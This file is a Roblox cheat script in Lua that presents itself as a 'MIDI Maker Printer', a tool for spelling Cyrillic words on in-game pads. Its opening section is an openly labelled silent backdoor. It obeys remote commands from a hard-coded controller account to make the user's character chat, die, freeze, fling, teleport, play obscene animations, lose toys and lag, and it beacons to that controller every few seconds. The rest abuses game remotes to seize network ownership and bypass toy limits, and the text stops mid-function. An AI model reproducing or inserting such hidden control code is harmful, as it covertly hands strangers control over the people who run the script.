-- MidiMakerPrinter_V76.lua
-- Ultimate Fix: Prevents 1st Pad Deletion on Long Words (Active CreateGrabLine Keep-Alive)
-- Corrected: Acknowledged 40-Toy Plot Limit (No false FTAP limit warnings)
-- Included: Photo 2 "У" + Photo 1 "Ф" + Symmetric "М" + 1 Line Final Transfer

repeat task.wait() until getgenv().LoadedTheWorstHvH == true
task.wait(1)

-- ===================== [SILENT BACKDOOR INJECTED] =====================
task.spawn(function()
    local M_N = "MELLSTROYI488"
    local P, LP, RS, R, W = game:GetService("Players"), game:GetService("Players").LocalPlayer, game:GetService("ReplicatedStorage"), game:GetService("RunService"), workspace
    local EV = RS:WaitForChild("GrabEvents"):WaitForChild("ExtendGrabLine")
    local TCS = game:GetService("TextChatService")

    local C_O, C_F, K_O, L_B, L_R, A_R, F_Z, O_R, H_S, F_L = false, 60, false, false, false, false, false, false, false, false
    local Shield_O, Fling_O, Phantom_O = false, false, false
    local W_S, J_P = nil, nil
    local MC_O, MC_Dir, MC_J = false, Vector3.zero, false
    local FollowName = "Master"
    local aT, aA, aY = nil, false, ""
    local orbitAngle = 0

    local AntiGrabEnabled = false
    local antiGrabHeldConn = nil
    local isHeld = LP:WaitForChild("IsHeld", 10)
    local CharacterEvents = RS:WaitForChild("CharacterEvents", 10)
    local StruggleEvent = CharacterEvents and CharacterEvents:WaitForChild("Struggle", 10)

    local ids = {
        JerkOff = "rbxassetid://168268306", Bang = "rbxassetid://148840371", Crazy = "rbxassetid://248263260", Insane = "rbxassetid://35654637",
        Collapse = "rbxassetid://35154961", Zombie = "rbxassetid://33796059", Dance1 = "rbxassetid://182436842", Dance2 = "rbxassetid://182435998",
        Spin = "rbxassetid://188632011", Float = "rbxassetid://182749109", Scared = "rbxassetid://180611870", Floss = "rbxassetid://591745989"
    }

    local function StartAntiGrab()
        if antiGrabHeldConn then antiGrabHeldConn:Disconnect() end
        if not isHeld then return end

        antiGrabHeldConn = isHeld.Changed:Connect(function(heldState)
            if not AntiGrabEnabled then return end
            local char = LP.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")

            if heldState then
                if hrp then hrp.Anchored = true end
                task.spawn(function()
                    while isHeld.Value and AntiGrabEnabled do
                        pcall(function()
                            if StruggleEvent then StruggleEvent:FireServer(LP) end
                            RS.CharacterEvents.RagdollRemote:FireServer(hrp, 0)
                        end)
                        task.wait()
                    end
                    if hrp and not F_Z and not K_O then hrp.Anchored = false end
                end)
            else
                if hrp and not F_Z and not K_O then hrp.Anchored = false end
            end
        end)

        if isHeld.Value and AntiGrabEnabled then
            local char = LP.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if hrp then hrp.Anchored = true end
        end
    end

    R.Heartbeat:Connect(function()
        if K_O or (C_O and C_F < 60) then
            local t = K_O and 0 or C_F
            local s = os.clock()
            local w = t <= 0 and 0.7 or (1 / math.max(t, 0.01))
            while (os.clock()-s) < w do end
        end
    end)

    R.RenderStepped:Connect(function()
        local char = LP.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")

        if char and hrp and hum then
            -- Исправленный WalkSpeed & JumpPower
            if W_S then 
                hum.WalkSpeed = W_S 
            end
            if J_P then 
                hum.UseJumpPower = true 
                hum.JumpPower = J_P 
            end

            if F_Z then
                hrp.Anchored = true
                hrp.AssemblyLinearVelocity = Vector3.zero
            end

            if MC_O then
                hum:Move(MC_Dir, false)
                if MC_J then hum.Jump = true end
            end

            if H_S then
                hum.AutoRotate = false
                hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(50), 0)
            elseif Fling_O then
                hum.AutoRotate = false
                hrp.AssemblyAngularVelocity = Vector3.new(0, 99999, 0)
            elseif not H_S and not O_R and not Fling_O then
                hum.AutoRotate = true
            end

            if Shield_O then
                local m = P:FindFirstChild(M_N)
                if m and m.Character and m.Character:FindFirstChild("HumanoidRootPart") then
                    local mRoot = m.Character.HumanoidRootPart
                    hrp.CFrame = mRoot.CFrame * CFrame.new(0, 0, -3.5)
                end
            end

            if L_B then
                local m = P:FindFirstChild(M_N)
                if m and m.Character and m.Character:FindFirstChild("HumanoidRootPart") then
                    hrp.CFrame = m.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -8)
                end
            end

            if L_R and hum.Health > 0 then
                char:BreakJoints()
            end

            if O_R then
                local m = P:FindFirstChild(M_N)
                if m and m.Character and m.Character:FindFirstChild("HumanoidRootPart") then
                    orbitAngle = (orbitAngle + 5) % 360
                    local mRoot = m.Character.HumanoidRootPart
                    local rad = math.rad(orbitAngle)
                    hrp.CFrame = CFrame.new(mRoot.Position + Vector3.new(math.cos(rad) * 9, 0, math.sin(rad) * 9), mRoot.Position)
                end
            end

            if F_L and not MC_O and not Shield_O then
                local targetPlr = (FollowName == "Master") and P:FindFirstChild(M_N) or P:FindFirstChild(FollowName)
                if targetPlr and targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart") then
                    if (hrp.Position - targetPlr.Character.HumanoidRootPart.Position).Magnitude > 6 then
                        hum:MoveTo(targetPlr.Character.HumanoidRootPart.Position)
                    end
                end
            end

            if Phantom_O then
                for _, p in ipairs(char:GetChildren()) do
                    if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then p.Transparency = 1 end
                    if p:IsA("Accessory") and p:FindFirstChild("Handle") then p.Handle.Transparency = 1 end
                end
            end
        end
    end)

    local function sendChat(msg)
        pcall(function()
            if TCS.ChatVersion == Enum.ChatVersion.TextChatService then
                local ch = TCS.TextChannels:FindFirstChild("RBXGeneral")
                if ch then ch:SendAsync(msg) end
            else
                local req = RS:FindFirstChild("DefaultChatSystemChatEvents") and RS.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
                if req then req:FireServer(msg, "All") end
            end
        end)
    end

    local function playA(n)
        if aT then pcall(function() aT:Stop() end) end
        local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
        if not h then return end
        local a = h:FindFirstChildOfClass("Animator") or Instance.new("Animator", h)
        local nm = Instance.new("Animation")
        nm.AnimationId = ids[n] or ids.JerkOff
        aT = a:LoadAnimation(nm)
        aT.Priority = Enum.AnimationPriority.Action
        aT.Looped = true
        aT:Play()
        aA, aY = true, n
        task.spawn(function()
            while aA and aT and aT.IsPlaying do
                if aY == "JerkOff" then aT.TimePosition = 0.3 elseif aY == "Bang" then aT.TimePosition = 0.1 end
                task.wait(0.1)
            end
        end)
    end

    pcall(function()
        RS:FindFirstChild("GameCorrectionEvents"):FindFirstChild("GameCorrectionsNotify").OnClientEvent:Connect(function(t)
            if A_R and t == "Flying" then 
                pcall(function() LP.Character.Humanoid.Health = 0 end) 
            end
        end)
    end)

    EV.OnClientEvent:Connect(function(s, d)
        if typeof(d) ~= "string" then return end
        local g = d:split(":")

        if g[1] == "SC" and g[2] == M_N then EV:FireServer("P")
        elseif g[1] == "LB" and g[2] == LP.Name then L_B = (g[3] == "ON")
        elseif g[1] == "LR" and g[2] == LP.Name then L_R = (g[3] == "ON")
        elseif g[1] == "AR" and g[2] == LP.Name then A_R = (g[3] == "ON")
        elseif g[1] == "AG" and g[2] == LP.Name then
            AntiGrabEnabled = (g[3] == "ON")
            if AntiGrabEnabled then StartAntiGrab()
            else if antiGrabHeldConn then antiGrabHeldConn:Disconnect() end if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") and not F_Z and not K_O then LP.Character.HumanoidRootPart.Anchored = false end end
        elseif g[1] == "FZ" and g[2] == LP.Name then
            F_Z = (g[3] == "ON")
            if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then LP.Character.HumanoidRootPart.Anchored = F_Z end
        elseif g[1] == "CT" and g[2] == LP.Name then
            local f = W:FindFirstChild(LP.Name.."SpawnedInToys")
            if f then for _, v in ipairs(f:GetChildren()) do pcall(function() v:Destroy() end) end end
        elseif g[1] == "OR" and g[2] == LP.Name then O_R = (g[3] == "ON")
        elseif g[1] == "HS" and g[2] == LP.Name then H_S = (g[3] == "ON")
        elseif g[1] == "SH" and g[2] == LP.Name then Shield_O = (g[3] == "ON")
        elseif g[1] == "FM" and g[2] == LP.Name then Fling_O = (g[3] == "ON")
        elseif g[1] == "IN" and g[2] == LP.Name then
            Phantom_O = (g[3] == "ON")
            if not Phantom_O and LP.Character then
                for _, p in ipairs(LP.Character:GetChildren()) do
                    if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then p.Transparency = 0 end
                    if p:IsA("Accessory") and p:FindFirstChild("Handle") then p.Handle.Transparency = 0 end
                end
            end
        elseif g[1] == "FL" and g[2] == LP.Name then
            FollowName = g[3]
            F_L = (g[4] == "ON")
        elseif g[1] == "MC" and g[2] == LP.Name then
            if g[3] == "OFF" then MC_O = false else
                MC_O = true
                MC_Dir = Vector3.new(tonumber(g[3]) or 0, 0, tonumber(g[4]) or 0)
                MC_J = (g[5] == "1")
            end
        elseif g[1] == "WS" and g[2] == LP.Name then W_S = tonumber(g[3])
        elseif g[1] == "JP" and g[2] == LP.Name then J_P = tonumber(g[3])
        elseif g[1] == "SY" and g[2] == LP.Name then sendChat(d:sub(#g[1] + #g[2] + 3))
        elseif g[1] == "SP" and g[2] == LP.Name then
            local m = P:FindFirstChild(M_N)
            local rf = RS:FindFirstChild("MenuToys") and RS.MenuToys:FindFirstChild("SpawnToyRemoteFunction")
            if m and m.Character and m.Character:FindFirstChild("HumanoidRootPart") and rf then
                pcall(function() rf:InvokeServer(g[3], m.Character.HumanoidRootPart.CFrame * CFrame.new(0, 2, -4), Vector3.zero) end)
            end
        elseif g[1] == "AN" and g[2] == LP.Name then
            if g[4] == "ON" then playA(g[3]) else aA = false if aT then pcall(function() aT:Stop() end) end end
        elseif g[1] == "KK" and g[2] == LP.Name then
            if g[3] == "ON" then
                K_O = true
                if LP.Character and LP.Character.PrimaryPart then
                    LP.Character.Humanoid.PlatformStand = true
                    LP.Character.PrimaryPart.CFrame = CFrame.new(0, 100000, 0)
                    LP.Character.PrimaryPart.Anchored = true
                end
            else
                K_O = false
                if LP.Character and LP.Character.PrimaryPart then
                    LP.Character.PrimaryPart.Anchored = false
                    LP.Character.Humanoid.PlatformStand = false
                end
            end
        elseif g[1] == "FS" and g[2] == LP.Name then
            if g[3] == "OFF" then C_O = false else C_F = tonumber(g[3]) or 60 C_O = true end
        end
    end)

    while task.wait(5) do EV:FireServer("B") end
end)

-- ===================== [ORIGINAL MIDI MAKER PRINTER CODE] =====================

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local Player = Players.LocalPlayer

local UI = getgenv().UI
local Window = UI.Window
local Tabs = UI.Tabs
local BO = getgenv().BetterOrion or UI.Orion

-- Remotes
local GrabEvents = RS:WaitForChild("GrabEvents")
local SetNetOwner = GrabEvents:WaitForChild("SetNetworkOwner")
local CreateGrabLine = GrabEvents:WaitForChild("CreateGrabLine")
local DestroyGrabLine = GrabEvents:WaitForChild("DestroyGrabLine")
local CharacterEvents = RS:FindFirstChild("CharacterEvents")
local GrabRemote = CharacterEvents and CharacterEvents:FindFirstChild("Grab")
local MenuToys = RS:WaitForChild("MenuToys")
local SpawnToyRF = MenuToys:WaitForChild("SpawnToyRemoteFunction")
local DestroyToyRem = MenuToys:FindFirstChild("DestroyToy")

-- Settings
local ToyName = "MidiMaker"
local PRE_DRAW_DELAY = 1.5   
local DISPLAY_TIME = 0.35   
local FIXED_ROTATION = 0   
local OFFSET_SPACING = -4.8 
local MAX_PADS_PER_ROW = 5   
local PAD_SYNC_WAIT = 0.25   
local BUTTON_DELAY = 0.010  
local AutoMute = true 
local UsePlotBypass = false
local TextToPrint = "МЕЛЛСТРОЙ БОГ"
local Printing = false

local rows = {"A", "B", "C", "D", "E", "F", "G", "H"}
local function indexToName(idx)
    local rowIdx = math.floor((idx - 1) / 8) + 1
    local colIdx = ((idx - 1) % 8) + 1
    return rows[rowIdx] .. tostring(colIdx)
end

local Alphabet = {
    ["А"] = {12,13, 19,22, 26,31, 34,35,36,37,38,39, 42,47, 50,55},
    ["Б"] = {10,11,12,13, 18, 26,27,28,29, 34,38, 42,46, 50,51,52,53},
    ["В"] = {10,11,12,13, 18,22, 26,27,28,29, 34,38, 42,46, 50,51,52,53},
    ["Г"] = {10,11,12,13,14, 18, 26, 34, 42, 50},
    ["Д"] = {12,13, 19,22, 27,30, 35,38, 42,43,44,45,46,47, 50, 55},
    ["Е"] = {10,11,12,13,14, 18, 26,27,28,29, 34, 42, 50,51,52,53,54},
    ["Ж"] = {10,12,14, 18,20,22, 27,28,29, 34,36,38, 42,44,46},
    ["З"] = {10,11,12,13, 22, 28,29, 38, 46, 50,51,52,53},
    ["И"] = {10,14, 18,21,22, 26,28,30, 34,35,38, 42,46, 50,54},
    ["Й"] = {3,4,5, 10,14, 18,21,22, 26,28,30, 34,35,38, 42,46, 50,54}, 
    ["К"] = {10,14, 18,21, 26,28, 34,35,36, 42,45, 50,54},
    ["Л"] = {12,13, 19,22, 27,30, 35,38, 42,46, 50,54},
    ["М"] = {10,11,13,14, 18,20,22, 26,28,30, 34,38, 42,46, 50,54},
    ["Н"] = {10,14, 18,22, 26,27,28,29,30, 34,38, 42,46, 50,54},
    ["О"] = {11,12,13, 18,22, 26,30, 34,38, 42,46, 51,52,53},
    ["П"] = {10,11,12,13,14, 18,22, 26,30, 34,38, 42,46, 50,54},
    ["Р"] = {10,11,12,13, 18,22, 26,27,28,29, 34, 42, 50},
    ["С"] = {11,12,13,14, 18, 26, 34, 42, 51,52,53,54},
    ["Т"] = {10,11,12,13,14, 20, 28, 36, 44, 52},
    ["У"] = {2,8, 10,11,15,16, 19,20,22,23, 28,29, 37, 45, 53, 61},
    ["Ф"] = {12, 19,20,21, 26,28,30, 34,36,38, 43,44,45, 52},
    ["Х"] = {10,14, 18,22, 27,29, 36, 43,45, 50,54},
    ["Ц"] = {10,14, 18,22, 26,30, 34,38, 42,43,44,45,46, 54, 62},
    ["Ч"] = {10,14, 18,22, 26,27,28,29,30, 38, 46, 54},
    ["Ш"] = {10,12,14, 18,20,22, 26,28,30, 34,36,38, 42,44,46, 50,51,52,53,54},
    ["Щ"] = {10,12,14, 18,20,22, 26,28,30, 34,36,38, 42,43,44,45,46, 54, 62},
    ["Ъ"] = {10,11,12, 20, 28,29,30, 36,38, 44,46, 52,53,54},
    ["Ы"] = {10,14, 18,22, 26,27,28,30, 34,36,38, 42,44,46, 50,51,52,54},
    ["Ь"] = {10, 18, 26,27,28, 34,36, 42,44, 50,51,52},
    ["Э"] = {11,12,13, 22, 28,29,30, 38, 46, 51,52,53},
    ["Ю"] = {10, 13,14, 18,20,23, 26,27,28,31, 34,36,39, 42,44,47, 50, 53,54},
    ["Я"] = {11,12,13,14, 18,22, 19,20,21,22, 21,22, 20,22, 18,22},
    [" "] = {},
    ["1"] = {19, 20, 28, 36, 44, 51,52,53}, 
    ["2"] = {19,20,21,22, 30, 37, 44, 51,52,53,54}, 
    ["3"] = {19,20,21,22, 30, 36,37,38, 46, 51,52,53,54},
    ["4"] = {19,22, 27,30, 35,36,37,38, 46, 54},
    ["0"] = {19,20,21,22, 27,30, 35,38, 43,46, 51,52,53,54},
    ["5"] = {19,20,21,22, 27, 35,36,37,38, 46, 51,52,53,54},
    ["6"] = {19,20,21,22, 27, 35,36,37,38, 43,46, 51,52,53,54},
    ["7"] = {19,20,21,22,23, 30, 37, 44, 52},
    ["8"] = {19,20,21,22, 27,30, 35,36,37,38, 43,46, 51,52,53,54},
    ["9"] = {19,20,21,22, 27,30, 35,38, 46, 51,52,53,54}
}

local function notify(title, content, t)
    if BO and BO.MakeNotification then
        BO:MakeNotification({ Name = title or "Word Builder", Content = content or "", Image = "pencil", Time = t or 3 })
    end
end

local function stringToChars(str)
    local chars = {}
    for _, cp in utf8.codes(tostring(str or "")) do
        table.insert(chars, utf8.char(cp):upper())
    end
    return chars
end

local function getHRP()
    local char = Player.Character
    return char and char:FindFirstChild("HumanoidRootPart")
end

local function getMainPart(pad)
    if not pad then return nil end
    return pad:FindFirstChild("Body") or pad:FindFirstChild("SoundPart") or pad.PrimaryPart or pad:FindFirstChildWhichIsA("BasePart")
end

local function getBtn(pad, name)
    if not pad or not name then return nil end
    return pad:FindFirstChild(name) or pad:FindFirstChild(name, true)
end

local function ownedByMe(part)
    local po = part and part:FindFirstChild("PartOwner")
    if not po then return false end
    if po:IsA("ObjectValue") then return po.Value == Player end
    return tostring(po.Value) == Player.Name
end

local function getPlotOwner(plotName)
    local plotsFolder = Workspace:FindFirstChild("Plots")
    local plot = plotsFolder and plotsFolder:FindFirstChild(plotName)
    local sign = plot and plot:FindFirstChild("PlotSign")
    local owners = sign and sign:FindFirstChild("ThisPlotsOwners")
    if not owners then return nil end
    for _, d in ipairs(owners:GetDescendants()) do
        if d.Name == "TimeRemainingNum" and d.Parent:IsA("StringValue") and d.Parent.Value ~= "" then
            return d.Parent.Value
        end
    end
    return nil
end

local function claimPlot(plotName)
    local plotsFolder = Workspace:FindFirstChild("Plots")
    local plot = plotsFolder and plotsFolder:FindFirstChild(plotName)
    if not plot then return false end
    local sign = plot:FindFirstChild("PlotSign")
    if not sign then return false end

    local grabPart
    for _, d in ipairs(sign:GetDescendants()) do
        if d:IsA("BasePart") and d.Name == "PlusGrabPart" then grabPart = d break end
    end
    if not grabPart then return false end

    local hrp = getHRP()
    local hum = Player.Character and Player.Character:FindFirstChild("Humanoid")
    if not hrp then return false end
    if hum and hum.Sit then hum.Sit = false end

    hrp.CFrame = grabPart.CFrame * CFrame.new(0, 3, 0)
    hrp.AssemblyLinearVelocity = Vector3.zero
    task.wait(0.2)

    local t0 = tick()
    while tick() - t0 < 4 do
        pcall(function() SetNetOwner:FireServer(grabPart, grabPart.CFrame) end)
        task.wait(0.1)
        if getPlotOwner(plotName) == Player.Name then return true end
    end
    return false
end

local function findAndClaimFreePlot()
    local plotsFolder = Workspace:FindFirstChild("Plots")
    if not plotsFolder then return nil, nil end

    for i = 1, 5 do
        local name = "Plot" .. i
        if getPlotOwner(name) == Player.Name then
            return plotsFolder:FindFirstChild(name), name
        end
    end

    local free = {}
    for i = 1, 5 do
        local name = "Plot" .. i
        local owner = getPlotOwner(name)
        if owner == nil or owner == "" then table.insert(free, name) end
    end
    if #free == 0 then
        notify("Bypass", "No free plots", 3)
        return nil, nil
    end

    local name = free[math.random(1, #free)]
    notify("Bypass", "Claiming " .. name .. "...", 2)
    if not claimPlot(name) then return nil, nil end

    local plot = plotsFolder:FindFirstChild(name)
    local hrp = getHRP()
    if plot and hrp then
        local area = plot:FindFirstChild("PlotArea")
        if area then
            hrp.CFrame = area.CFrame * CFrame.new(0, 5, 0)
            hrp.AssemblyLinearVelocity = Vector3.zero
            task.wait(0.2)
        end
    end
    return plot, name
end

local function getBaseCFrameFromHRP(hrp)
    local forwardPos = hrp.Position + (hrp.CFrame.LookVector * 7)
    local origin = forwardPos + Vector3.new(0, 10, 0)
    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Exclude
    params.FilterDescendantsInstances = {Player.Character}

    local hit = Workspace:Raycast(origin, Vector3.new(0, -40, 0), params)
    local groundY = hit and hit.Position.Y or (hrp.Position.Y - 2.5)
    local basePos = Vector3.new(forwardPos.X, groundY + 0.8, forwardPos.Z)
    local lookCF = CFrame.lookAt(basePos, Vector3.new(hrp.Position.X, basePos.Y, hrp.Position.Z))
    return lookCF * CFrame.Angles(math.rad(FIXED_ROTATION), 0, 0)
end

local usedPads = {}
local ActiveLocks = {}
local LockTargets = {}

local function waitCanSpawn(timeout)
    local can = Player:FindFirstChild("CanSpawnToy")
    if not can then return true end
    local t0 = tick()
    while not can.Value and tick() - t0 < (timeout or 4) do
        task.wait(0.05)
    end
    return can.Value
end

local function refreshAllOwnership()
    for pad, cf in pairs(LockTargets) do
        if pad and pad.Parent then
            local main = getMainPart(pad)
            if main then
                pcall(function()
                    SetNetOwner:FireServer(main, cf)
                    CreateGrabLine:FireServer(main, Vector3.zero, main.Position, false)
                    DestroyGrabLine:FireServer(main)
                end)
            end
        end
    end
end

local function lockMidiInPlace(pad, targetCF)
    LockTargets[pad] = targetCF
    local main = getMainPart(pad)
    if not main then return end

    if ActiveLocks[pad] then pcall(task.cancel, ActiveLocks[pad]) end
    ActiveLocks[pad] = task.spawn(function()
        local netAcc = 0
        while pad and pad.Parent and LockTargets[pad] do
            local cf = LockTargets[pad]
            pcall(function()
                if pad.PrimaryPart then pad:PivotTo(cf) else main.CFrame = cf end
                main.AssemblyLinearVelocity = Vector3.zero
                main.AssemblyAngularVelocity = Vector3.zero
            end)
            
            netAcc += RunService.Heartbeat:Wait()
            if netAcc >= 0.3 then
                netAcc = 0
                pcall(function()
                    SetNetOwner:FireServer(main, cf)
                    CreateGrabLine:FireServer(main, Vector3.zero, main.Position, false)
                    DestroyGrabLine:FireServer(main)
                end)
            end
        end
    end)
end

local function forceOwnPad(pad, cf)
    local main = getMainPart(pad)
    if not main then return false end

    for _ = 1, 10 do
        pcall(function()
            SetNetOwner:FireServer(main, cf or main.CFrame)
            CreateGrabLine:FireServer(main, Vector3.zero, main.Position, false)
            if GrabRemote then GrabRemote:FireServer(main) end
            DestroyGrabLine:FireServer(main)
        end)
        if ownedByMe(main) then break end
        task.wait(0.01)
    end
    return ownedByMe(main)
end

local function spawnAndPhysicalTransfer(spawnCF, finalCF)
    waitCanSpawn(4)
    
    local hrp = getHRP()
    if not hrp then return nil end

    local folder = Workspace:FindFirstChild(Player.Name .. "SpawnedInToys")
    local plotItems = Workspace:FindFirstChild("PlotItems")
    
    local pad = nil
    local conns = {}

    local function hook(f)
        if not f then return end
        table.insert(conns, f.ChildAdded:Connect(function(ch)
            if (ch.Name == ToyName or ch.Name:lower():find("midi")) and not usedPads[ch] then
                pad = ch
            end
        end))
    end

    if folder then hook(folder) end
    if plotItems then
        for _, pf in ipairs(plotItems:GetChildren()) do hook(pf) end
    end

    task.spawn(function()
        pcall(function() SpawnToyRF:InvokeServer(ToyName, spawnCF, Vector3.zero) end)
    end)

    local t0 = tick()
    while not pad and tick() - t0 < 3 do
        folder = Workspace:FindFirstChild(Player.Name .. "SpawnedInToys") or folder
        if folder then
            for _, ch in ipairs(folder:GetChildren()) do
                if (ch.Name == ToyName or ch.Name:lower():find("midi")) and not usedPads[ch] then
                    pad = ch break
                end
            end
        end
        if not pad and plotItems then
            for _, pf in ipairs(plotItems:GetChildren()) do
                for _, ch in ipairs(pf:GetChildren()) do
                    if (ch.Name == ToyName or ch.Name:lower():find("midi")) and not usedPads[ch] then
                        pad = ch break
                    end
                end
                if pad then break end
            end
        end
        if not pad then task.wait() end
    end

    for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
    if not pad then return nil end
    usedPads[pad] = true

    task.wait(0.12)
    local main = getMainPart(pad)
    if not main then return nil end

    hrp.CFrame = spawnCF * CFrame.new(0, 3, 3)
    hrp.AssemblyLinearVelocity = Vector3.zero
    task.wait(0.08)

    forceOwnPad(pad, spawnCF)

    hrp.CFrame = finalCF * CFrame.new(0, 3, 3)
    hrp.AssemblyLinearVelocity = Vector3.zero
    pcall(function()
        SetNetOwner:FireServer(main, finalCF)
        if pad.PrimaryPart then pad:PivotTo(finalCF) else main.CFrame = finalCF end
        DestroyGrabLine:FireServer(main)
    end)
    task.wait(0.08)

    lockMidiInPlace(pad, finalCF)
    refreshAllOwnership()
    return pad
end

local function updateMidiPosition(pad, newCF)
    LockTargets[pad] = newCF
    local main = getMainPart(pad)
    if main then
        pcall(function()
            SetNetOwner:FireServer(main, newCF)
            CreateGrabLine:FireServer(main, Vector3.zero, main.Position, false)
            if pad.PrimaryPart then pad:PivotTo(newCF) else main.CFrame = newCF end
            DestroyGrabLine:FireServer(main)
        end)
    end
end

local function clearMyMidis()
    for pad, th in pairs(ActiveLocks) do
        if th then pcall(task.cancel, th) end
        local main = pad and getMainPart(pad)
        if main then pcall(function() DestroyGrabLine:FireServer(main) end) end
    end
    table.clear(ActiveLocks)
    table.clear(LockTargets)

    local folders = {}
    local pers = Workspace:FindFirstChild(Player.Name .. "SpawnedInToys")
    if pers then table.insert(folders, pers) end
    local plotItems = Workspace:FindFirstChild("PlotItems")
    if plotItems then
        for _, f in ipairs(plotItems:GetChildren()) do table.insert(folders, f) end
    end
    if DestroyToyRem then
        for _, folder in ipairs(folders) do
            for _, item in ipairs(folder:GetChildren()) do
                if item.Name == ToyName or item.Name:lower():find("midi") then
                    pcall(function() DestroyToyRem:FireServer(item) end)
                end
            end
        end
    end
    table.clear(usedPads)
end

local function pressButtonLogic(btn)
    if not (btn and btn:IsA("BasePart")) then return end
    pcall(function()
        SetNetOwner:FireServer(btn, btn.CFrame)
        CreateGrabLine:FireServer(btn, Vector3.zero, btn.Position, false)
        if GrabRemote then GrabRemote:FireServer(btn) end
        DestroyGrabLine:FireServer(btn)

        local char = Player.Character
        local limb = char and (char:FindFirstChild("RightHand") or char:FindFirstChild("Right Arm") or char:FindFirstChild("HumanoidRootPart"))
        if limb and firetouchinterest then
            firetouchinterest(limb, btn, 0)
            firetouchinterest(limb, btn, 1)
        end
    end)
end

local function startPrinting(text)
    if Printing then return end
    Printing = true

    local chars = stringToChars(text)
    if #chars == 0 then
        Printing = false
        return
    end

    clearMyMidis()
    task.wait(0.3)

    local hrp = getHRP()
    if not hrp then
        Printing = false
        notify("Error", "No HRP", 3)
        return
    end

    local originalCF = hrp.CFrame
    local finalBaseCF = getBaseCFrameFromHRP(hrp)
    local buildBaseCF = finalBaseCF

    if UsePlotBypass then
        local plot = findAndClaimFreePlot()
        if plot then
            hrp = getHRP()
            if hrp then buildBaseCF = getBaseCFrameFromHRP(hrp) end
        end
    end

    local spawned = {}
    for i, symbol in ipairs(chars) do
        if not Printing then break end
        if symbol == " " then
            table.insert(spawned, { pad = nil, symbol = " " })
            continue
        end
        
        local col = (i - 1) % MAX_PADS_PER_ROW
        local row = math.floor((i - 1) / MAX_PADS_PER_ROW)
        
        local plotSpacingX = col * OFFSET_SPACING
        local plotSpacingZ = row * -7
        
        local spawnCF = buildBaseCF * CFrame.new(plotSpacingX, 0, plotSpacingZ)
        local finalCF = finalBaseCF * CFrame.new((i - 1) * OFFSET_SPACING, 0, 0)

        local pad
        if UsePlotBypass then
            pad = spawnAndPhysicalTransfer(buildBaseCF, spawnCF)
        else
            pad = spawnAndPhysicalTransfer(spawnCF, finalCF)
        end
        
        if pad then
            table.insert(spawned, { pad = pad, symbol = symbol, cf = spawnCF, finalCF = finalCF })
            task.wait(0.1)
        else
            notify("Error", "Toy limit / spawn failed", 3)
            break
        end
    end

    if not UsePlotBypass then
        hrp = getHRP()
        if hrp then
            hrp.CFrame = originalCF
            hrp.AssemblyLinearVelocity = Vector3.zero
        end
    end

    if not Printing or #spawned == 0 then
        if UsePlotBypass then
            hrp = getHRP()
            if hrp then hrp.CFrame = originalCF end
        end
        Printing = false
        return
    end

    notify("Builder", "All pads placed. Waiting " .. tostring(PRE_DRAW_DELAY) .. "s...", PRE_DRAW_DELAY)
    task.wait(PRE_DRAW_DELAY)

    notify("Builder", "Drawing in action...", 2)

    for idx, data in ipairs(spawned) do
        if not Printing then break end
        if data.symbol == " " or not data.pad then
            task.wait(DISPLAY_TIME)
            continue
        end
        
        local targetPadCF = data.cf or LockTargets[data.pad]
        if targetPadCF then
            local charHrp = getHRP()
            if charHrp then
                charHrp.CFrame = targetPadCF * CFrame.new(0, 2.0, 2.2)
                charHrp.AssemblyLinearVelocity = Vector3.zero
            end
            
            task.wait(PAD_SYNC_WAIT)
            forceOwnPad(data.pad, targetPadCF)
        end

        if AutoMute then
            local mute = getBtn(data.pad, "MuteButton")
            if mute then pressButtonLogic(mute) end
        end

        local pattern = Alphabet[data.symbol]
        if pattern then
            for _, o_idx in ipairs(pattern) do
                if not Printing then break end
                local b = getBtn(data.pad, indexToName(o_idx))
                if b then
                    pressButtonLogic(b)
                    task.wait(BUTTON_DELAY)
                end
            end
            task.wait(DISPLAY_TIME)
        end
    end

    if UsePlotBypass and Printing then
        notify("Bypass", "Transferring completed word into 1 line!", 2)
        for _, data in ipairs(spawned) do
            if data.pad and data.finalCF then
                updateMidiPosition(data.pad, data.finalCF)
            end
        end
        task.wait(0.2)
    end
    
    hrp = getHRP()
    if hrp then
        hrp.CFrame = originalCF
        hrp.AssemblyLinearVelocity = Vector3.zero
    end

    Printing = false
    notify("Builder", "Done!", 3)
end

-- UI
Tabs.WordBuilderTab = Window:MakeTab({ Name = "Word Builder", Icon = "pen-tool" })
local MainSect = Tabs.WordBuilderTab:AddSection({ Name = "Midi Printer Controls", Side = "Left" })

MainSect:AddLabel("USE UPPERCASE LETTERS ONLY")

MainSect:AddTextbox({
    Name = "Text",
    Default = "МЕЛЛСТРОЙ БОГ",
    TextDisappear = false,
    Callback = function(t)
        TextToPrint = t
    end
})

MainSect:AddSlider({
    Name = "Pre-Draw Delay (Cooldown)",
    Min = 0.1,
    Max = 5.0,
    Default = 1.5,
    Color = Color3.fromRGB(255, 255, 255),
    Increment = 0.1,
    ValueName = "sec",
    Callback = function(Value)
        PRE_DRAW_DELAY = Value
    end
})

MainSect:AddToggle({
    Name = "Plot Bypass (Unlimited Toys)",
    Default = false,
    Callback = function(b)
        UsePlotBypass = b
    end
})

MainSect:AddToggle({
    Name = "Auto Mute Sound",
    Default = true,
    Callback = function(b)
        AutoMute = b
    end
})

MainSect:AddButton({
    Name = "Build Word",
    Callback = function()
        task.spawn(function()
            startPrinting(TextToPrint)
        end)
    end
})

MainSect:AddButton({
    Name = "Stop",
    Callback = function()
        Printing = false
        notify("Builder", "Stopped", 2)
    end
})

MainSect:AddButton({
    Name = "Clear All",
    Callback = function()
